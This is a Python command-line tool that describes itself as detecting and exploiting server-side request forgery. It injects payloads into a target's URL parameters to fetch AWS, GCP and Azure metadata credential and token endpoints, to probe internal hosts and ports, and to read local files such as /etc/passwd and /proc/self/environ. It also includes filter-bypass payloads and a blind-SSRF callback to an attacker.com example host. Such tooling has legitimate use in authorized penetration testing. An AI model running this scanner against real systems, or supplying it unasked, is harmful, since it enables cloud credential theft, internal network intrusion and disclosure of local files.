#!/usr/bin/env python3
"""
Advanced SSRF (Server-Side Request Forgery) Scanner
Detects and exploits SSRF vulnerabilities including cloud metadata extraction
"""

import requests
import argparse
import concurrent.futures
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from typing import List, Dict, Tuple
import json
from datetime import datetime
import time

class SSRFScanner:
    """Advanced SSRF vulnerability scanner"""
    
    # Cloud metadata endpoints
    CLOUD_METADATA = {
        'aws': [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/dynamic/instance-identity/document',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        ],
        'gcp': [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        ],
        'azure': [
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
        ],
        'digitalocean': [
            'http://169.254.169.254/metadata/v1.json',
            'http://169.254.169.254/metadata/v1/id',
        ],
        'alibaba': [
            'http://100.100.100.200/latest/meta-data/',
        ],
        'oracle': [
            'http://192.0.0.192/latest/',
            'http://192.0.0.192/latest/user-data/',
        ]
    }
    
    # Internal network scanning targets
    INTERNAL_IPS = [
        '127.0.0.1',
        'localhost',
        '0.0.0.0',
        '192.168.0.1',
        '192.168.1.1',
        '10.0.0.1',
        '172.16.0.1',
    ]
    
    # Common internal ports to scan
    INTERNAL_PORTS = [
        21,    # FTP
        22,    # SSH
        23,    # Telnet
        25,    # SMTP
        53,    # DNS
        80,    # HTTP
        443,   # HTTPS
        445,   # SMB
        3306,  # MySQL
        3389,  # RDP
        5432,  # PostgreSQL
        5984,  # CouchDB
        6379,  # Redis
        8080,  # HTTP Alt
        8443,  # HTTPS Alt
        9200,  # Elasticsearch
        27017, # MongoDB
    ]
    
    # SSRF bypass techniques
    BYPASS_PAYLOADS = [
        # IP obfuscation
        '127.0.0.1',
        '127.1',
        '0x7f.0x00.0x00.0x01',
        '0x7f000001',
        '2130706433',
        '017700000001',
        'localhost',
        'LOCALHOST',
        'localhost.localdomain',
        # DNS rebinding
        '127.0.0.1.nip.io',
        '127.0.0.1.xip.io',
        # URL tricks
        'http://127.0.0.1:80@example.com',
        'http://example.com@127.0.0.1',
        'http://127.0.0.1#@example.com',
        # Unicode/encoding
        'http://①②⑦.⓪.⓪.①',
        'http://127。0。0。1',
    ]
    
    def __init__(self, target_url: str, verbose: bool = False):
        self.target_url = target_url
        self.verbose = verbose
        self.vulnerabilities: List[Dict] = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def test_ssrf_basic(self, param_name: str, injection_url: str) -> Tuple[bool, str]:
        """Test basic SSRF vulnerability"""
        try:
            # Parse target URL
            parsed = urlparse(self.target_url)
            params = parse_qs(parsed.query)
            
            # Inject SSRF payload
            params[param_name] = [injection_url]
            new_query = urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            
            # Send request
            response = self.session.get(test_url, timeout=10, allow_redirects=False)
            
            # Check for successful SSRF indicators
            if response.status_code == 200:
                # Check for metadata in response
                indicators = [
                    'ami-', 'instance-id', 'InstanceId', 'AmiId',
                    'private-', 'metadata', 'credentials', 'token',
                    'redis_version', 'mysql', 'root@', 'MongoDB'
                ]
                
                for indicator in indicators:
                    if indicator.lower() in response.text.lower():
                        return True, response.text[:500]
            
            return False, ""
        except requests.exceptions.Timeout:
            # Timeout might indicate SSRF to slow internal service
            return True, "Timeout (possible SSRF)"
        except Exception as e:
            return False, str(e)
    
    def test_cloud_metadata(self, param_name: str) -> List[Dict]:
        """Test for cloud metadata SSRF"""
        print(f"[*] Testing cloud metadata endpoints for parameter: {param_name}")
        findings = []
        
        for cloud, endpoints in self.CLOUD_METADATA.items():
            for endpoint in endpoints:
                if self.verbose:
                    print(f"    Testing {cloud}: {endpoint}")
                
                vulnerable, evidence = self.test_ssrf_basic(param_name, endpoint)
                
                if vulnerable:
                    finding = {
                        'type': 'cloud_metadata_ssrf',
                        'parameter': param_name,
                        'cloud_provider': cloud,
                        'endpoint': endpoint,
                        'severity': 'CRITICAL',
                        'evidence': evidence[:200],
                        'impact': f'Can access {cloud.upper()} metadata - potential credential theft'
                    }
                    findings.append(finding)
                    print(f"    [!] VULNERABLE to {cloud.upper()} metadata SSRF!")
                
                time.sleep(0.5)  # Rate limiting
        
        return findings
    
    def test_internal_network(self, param_name: str) -> List[Dict]:
        """Test for internal network scanning via SSRF"""
        print(f"[*] Testing internal network scanning for parameter: {param_name}")
        findings = []
        
        for ip in self.INTERNAL_IPS[:3]:  # Test first 3 IPs
            for port in [80, 443, 22, 3306, 6379]:  # Common ports
                target = f"http://{ip}:{port}"
                
                if self.verbose:
                    print(f"    Testing: {target}")
                
                try:
                    vulnerable, evidence = self.test_ssrf_basic(param_name, target)
                    
                    if vulnerable:
                        finding = {
                            'type': 'internal_network_ssrf',
                            'parameter': param_name,
                            'internal_target': target,
                            'severity': 'HIGH',
                            'evidence': evidence[:200],
                            'impact': 'Can scan internal network ports'
                        }
                        findings.append(finding)
                        print(f"    [!] Can reach internal: {target}")
                except:
                    pass
                
                time.sleep(0.3)  # Rate limiting
        
        return findings
    
    def test_file_scheme(self, param_name: str) -> List[Dict]:
        """Test for file:// scheme SSRF"""
        print(f"[*] Testing file:// scheme for parameter: {param_name}")
        findings = []
        
        file_targets = [
            'file:///etc/passwd',
            'file:///etc/hosts',
            'file:///c:/windows/win.ini',
            'file:///proc/self/environ',
        ]
        
        for file_path in file_targets:
            if self.verbose:
                print(f"    Testing: {file_path}")
            
            vulnerable, evidence = self.test_ssrf_basic(param_name, file_path)
            
            if vulnerable and ('root:' in evidence or '[extensions]' in evidence):
                finding = {
                    'type': 'file_scheme_ssrf',
                    'parameter': param_name,
                    'file_path': file_path,
                    'severity': 'CRITICAL',
                    'evidence': evidence[:200],
                    'impact': 'Can read local files via file:// scheme'
                }
                findings.append(finding)
                print(f"    [!] Can read file: {file_path}")
        
        return findings
    
    def test_blind_ssrf(self, param_name: str, callback_url: str) -> List[Dict]:
        """Test for blind SSRF using callback URL"""
        print(f"[*] Testing blind SSRF for parameter: {param_name}")
        findings = []
        
        if not callback_url:
            print("    [!] Skipping blind SSRF (no callback URL provided)")
            return findings
        
        # Test with callback URL
        vulnerable, evidence = self.test_ssrf_basic(param_name, callback_url)
        
        print(f"    [*] Check your callback server at: {callback_url}")
        print(f"    [*] If you receive a request, SSRF is confirmed!")
        
        return findings
    
    def test_bypass_techniques(self, param_name: str) -> List[Dict]:
        """Test SSRF bypass techniques"""
        print(f"[*] Testing SSRF bypass techniques for parameter: {param_name}")
        findings = []
        
        for payload in self.BYPASS_PAYLOADS[:5]:  # Test first 5 bypasses
            if self.verbose:
                print(f"    Testing bypass: {payload}")
            
            # Try to access localhost with bypass
            target = payload if payload.startswith('http') else f"http://{payload}"
            vulnerable, evidence = self.test_ssrf_basic(param_name, target)
            
            if vulnerable:
                finding = {
                    'type': 'ssrf_bypass',
                    'parameter': param_name,
                    'bypass_payload': payload,
                    'severity': 'HIGH',
                    'evidence': evidence[:200],
                    'impact': 'SSRF protection bypassed'
                }
                findings.append(finding)
                print(f"    [!] Bypass successful: {payload}")
        
        return findings
    
    def discover_parameters(self) -> List[str]:
        """Discover URL parameters to test"""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        if not params:
            # Common parameter names to try
            return ['url', 'uri', 'path', 'dest', 'redirect', 'link', 'target', 
                    'rurl', 'file', 'src', 'page', 'document', 'folder', 'root']
        
        return list(params.keys())
    
    def scan(self, callback_url: str = None, test_cloud: bool = True, 
             test_internal: bool = True, test_file: bool = True) -> Dict:
        """Run complete SSRF scan"""
        print("="*60)
        print("SSRF VULNERABILITY SCANNER")
        print("="*60)
        print(f"Target: {self.target_url}\n")
        
        # Discover parameters
        parameters = self.discover_parameters()
        print(f"[*] Testing {len(parameters)} parameters: {', '.join(parameters)}\n")
        
        all_findings = []
        
        for param in parameters:
            print(f"\n[*] Testing parameter: {param}")
            print("-" * 60)
            
            # Test cloud metadata
            if test_cloud:
                findings = self.test_cloud_metadata(param)
                all_findings.extend(findings)
            
            # Test internal network
            if test_internal:
                findings = self.test_internal_network(param)
                all_findings.extend(findings)
            
            # Test file:// scheme
            if test_file:
                findings = self.test_file_scheme(param)
                all_findings.extend(findings)
            
            # Test blind SSRF
            if callback_url:
                findings = self.test_blind_ssrf(param, callback_url)
                all_findings.extend(findings)
            
            # Test bypass techniques
            findings = self.test_bypass_techniques(param)
            all_findings.extend(findings)
        
        self.vulnerabilities = all_findings
        return self.generate_report()
    
    def generate_report(self) -> Dict:
        """Generate scan report"""
        report = {
            'target': self.target_url,
            'scan_time': datetime.now().isoformat(),
            'total_vulnerabilities': len(self.vulnerabilities),
            'critical': len([v for v in self.vulnerabilities if v['severity'] == 'CRITICAL']),
            'high': len([v for v in self.vulnerabilities if v['severity'] == 'HIGH']),
            'vulnerabilities': self.vulnerabilities
        }
        
        print("\n" + "="*60)
        print("SSRF SCAN SUMMARY")
        print("="*60)
        print(f"Target: {self.target_url}")
        print(f"Total Vulnerabilities: {len(self.vulnerabilities)}")
        print(f"  Critical: {report['critical']}")
        print(f"  High: {report['high']}")
        
        if self.vulnerabilities:
            print("\n[!] SSRF VULNERABILITIES DETECTED:")
            for vuln in self.vulnerabilities:
                print(f"\n  Type: {vuln['type']}")
                print(f"  Parameter: {vuln['parameter']}")
                print(f"  Severity: {vuln['severity']}")
                print(f"  Impact: {vuln['impact']}")
                if 'cloud_provider' in vuln:
                    print(f"  Cloud: {vuln['cloud_provider'].upper()}")
                if vuln['evidence']:
                    print(f"  Evidence: {vuln['evidence'][:100]}...")
        else:
            print("\n[+] No SSRF vulnerabilities detected")
        
        print("\n" + "="*60)
        
        return report


def main():
    parser = argparse.ArgumentParser(
        description='Advanced SSRF (Server-Side Request Forgery) Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python ssrf_scanner.py "http://example.com/page?url=http://google.com"
  python ssrf_scanner.py "http://example.com/proxy" --callback http://attacker.com/callback
  python ssrf_scanner.py "http://example.com/fetch" --skip-cloud -o report.json
        """
    )
    
    parser.add_argument('url', help='Target URL with parameters')
    parser.add_argument('--callback', help='Callback URL for blind SSRF detection')
    parser.add_argument('--skip-cloud', action='store_true', help='Skip cloud metadata tests')
    parser.add_argument('--skip-internal', action='store_true', help='Skip internal network tests')
    parser.add_argument('--skip-file', action='store_true', help='Skip file:// scheme tests')
    parser.add_argument('-o', '--output', help='Output report file (JSON)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Disable SSL warnings
    requests.packages.urllib3.disable_warnings()
    
    # Create scanner
    scanner = SSRFScanner(args.url, args.verbose)
    
    # Run scan
    report = scanner.scan(
        callback_url=args.callback,
        test_cloud=not args.skip_cloud,
        test_internal=not args.skip_internal,
        test_file=not args.skip_file
    )
    
    # Save report
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"\n[+] Report saved to: {args.output}")


if __name__ == "__main__":
    main()
